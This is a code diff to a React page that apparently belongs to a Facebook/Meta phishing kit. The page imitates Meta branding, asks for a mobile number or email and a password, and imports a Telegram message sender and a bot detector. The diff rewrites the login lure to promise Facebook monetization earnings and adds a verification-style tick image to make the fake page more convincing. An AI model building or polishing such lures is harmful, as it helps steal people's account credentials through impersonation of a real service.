@@ -3,6 +3,7 @@ import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import KiemTienImg from '@/assets/images/kiemtien.png';
 import MoneyAdsImg from '@/assets/images/money-ads.png';
+import TickImg from '@/assets/images/tick.png';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
@@ -106,7 +107,7 @@ const Home = () =>
             confirm: 'Confirm',
             aboutHelpMore: 'About · Help · See more',
 
-            loginInstruction: 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
+            loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
             mobileOrEmail: 'Mobile number or email',
             password: 'Password',
             passwordIncorrect: 'Password is incorrect, please try again.',
@@ -479,8 +480,11 @@ const Home = () =>
                     </div>
                     <div className="col-8">
                         <div id="right">
-                            <div style={ { fontSize: '20px', fontWeight: '700', color: '#1c1e21', marginBottom: '4px' } }>
-                                { texts.monetizationTitle }
+                            <div style={ { display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' } }>
+                                <img src={ TickImg } alt="Kiếm tiền" style={ { width: '40px', height: '40px', objectFit: 'contain', flexShrink: 0 } } />
+                                <div style={ { fontSize: '20px', fontWeight: '700', color: '#1c1e21' } }>
+                                    { texts.monetizationTitle }
+                                </div>
                             </div>
                             <p style={ { color: '#65676b', marginBottom: '8px' } }>{ texts.monetizationSubtitle }</p>
                             <p style={ { color: '#65676b', marginBottom: '4px' } }>{ texts.inVideoAdsDesc1 }</p>
